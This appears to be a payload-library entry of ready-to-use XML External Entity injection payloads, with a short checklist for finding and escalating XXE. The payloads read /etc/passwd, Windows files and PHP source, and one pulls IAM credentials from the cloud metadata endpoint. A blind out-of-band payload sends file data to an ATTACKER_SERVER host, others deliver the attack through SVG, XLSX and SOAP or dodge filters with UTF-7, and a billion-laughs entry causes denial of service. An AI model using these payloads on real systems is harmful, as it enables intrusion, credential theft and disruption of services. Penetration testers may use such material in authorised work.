---
id: "xxe-payloads"
title: "XXE Payloads - XML External Entity Injection"
type: "payload"
category: "web-application"
subcategory: "xxe"
tags: ["xxe", "xml", "payload", "oob", "blind", "ssrf"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["ssrf-payloads", "attack-workflow-chains"]
updated: "2026-04-04"
---

## Overview

XML External Entity (XXE) injection payloads for file read, SSRF, and remote code execution. Test any endpoint that accepts XML, SOAP, SVG, DOCX, or XLSX input.

## Payloads

### Classic File Read

Read local files via external entity declaration

- **Contexts**: xml
- **Severity**: high

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Windows File Read

Read Windows system files

- **Contexts**: xml
- **Severity**: high

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### SSRF via XXE

Server-side request forgery through XXE

- **Contexts**: xml
- **Severity**: critical

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```

### Blind XXE with Out-of-Band Exfiltration

Exfiltrate data when no output is reflected

- **Contexts**: xml
- **Severity**: high

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/xxe.dtd">
  %xxe;
]>
<root>test</root>
```

Host this DTD on your server (`xxe.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_SERVER/?data=%file;'>">
%eval;
%exfil;
```

### Blind XXE via Error-Based

Extract data through error messages

- **Contexts**: xml
- **Severity**: high

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>
```

### PHP Filter XXE

Read PHP source code via base64 encoding

- **Contexts**: xml
- **Severity**: high

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">
]>
<root>&xxe;</root>
```

### XXE via SVG Upload

XXE through SVG file upload

- **Contexts**: svg, file-upload
- **Severity**: high

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### XXE via XLSX

XXE through Excel file upload (modify xl/workbook.xml inside XLSX)

- **Contexts**: file-upload, xlsx
- **Severity**: high

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheets>
    <sheet name="&xxe;" sheetId="1" />
  </sheets>
</workbook>
```

### XXE via SOAP

XXE in SOAP web services

- **Contexts**: soap, api
- **Severity**: high

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <test>&xxe;</test>
  </soapenv:Body>
</soapenv:Envelope>
```

### XInclude Attack

When you can't control the full XML document but can inject into a value

- **Contexts**: xml, partial-control
- **Severity**: high

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### UTF-7 Encoded XXE

Bypass XML filters using UTF-7 encoding

- **Contexts**: xml
- **Severity**: high

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo +AFs-
  +ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AFs-+AD4-
+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-
```

### XXE Denial of Service (Billion Laughs)

For testing parser limits only — do NOT use on production targets

- **Contexts**: xml
- **Severity**: info

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
```

## Detection Checklist

```
1. Identify XML input points:
   □ Content-Type: application/xml or text/xml
   □ SOAP endpoints
   □ File upload accepting SVG, DOCX, XLSX, XML
   □ RSS/Atom feed processors
   □ SAML authentication

2. Test basic entity:
   □ Define internal entity, check if resolved in response
   □ If reflected → classic XXE
   □ If not reflected → try blind XXE with OOB

3. Escalate:
   □ File read → sensitive configs, source code, keys
   □ SSRF → internal services, cloud metadata
   □ RCE → via expect:// (PHP), jar:// (Java)
```
